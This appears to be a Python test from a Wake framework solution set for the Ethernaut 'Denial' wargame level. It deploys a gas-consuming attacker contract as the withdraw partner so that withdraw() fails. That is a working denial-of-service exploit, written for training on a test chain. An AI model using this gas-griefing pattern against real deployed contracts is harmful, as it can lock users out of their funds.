from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv20_denial import Denial
from pytypes.contracts.attacker.lv20_broken_contract import BrokenContract

@default_chain.connect()
def test_lv20():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv20()
    exploit_lv20(contract,ethernaut.attacker)
    ethernaut.check_lv20(contract)
    

def exploit_lv20(contract: Denial, attacker: Account):
    # Attack vector: function, that 'never' reverts
    # Training: find opcode, that forces function to use all gas -> Denial.withdraw() function reverts
    exploitContract = BrokenContract.deploy()
    contract.call(value=100, from_=attacker.address)
    contract.setWithdrawPartner(exploitContract.address)
    contract.withdraw()
